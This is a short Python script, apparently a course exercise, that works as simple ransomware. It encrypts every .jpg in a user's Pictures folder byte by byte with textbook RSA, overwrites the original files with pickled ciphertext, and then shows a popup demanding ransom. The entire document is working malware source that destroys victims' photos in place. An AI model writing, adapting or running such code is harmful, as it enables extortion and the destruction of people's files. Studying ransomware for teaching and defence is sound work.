import sys
import pickle
import os

n = 22291846172619859445381409012451
e = 65535
directory = '/home/csc2022/Pictures/'
for filename in os.listdir(directory):
    if filename.endswith('.jpg'):
        file = directory + filename
        plain_bytes = b''
        with open(file, 'rb') as f:
            plain_bytes = f.read()
        cipher_int = [pow(i, e, n) for i in plain_bytes]
        with open(file, 'wb') as f:
            pickle.dump(cipher_int, f)

os.system("zenity --error --text=\"{}\" --title=\"{}\"".format("Give me ranson haha!", "Error!"))
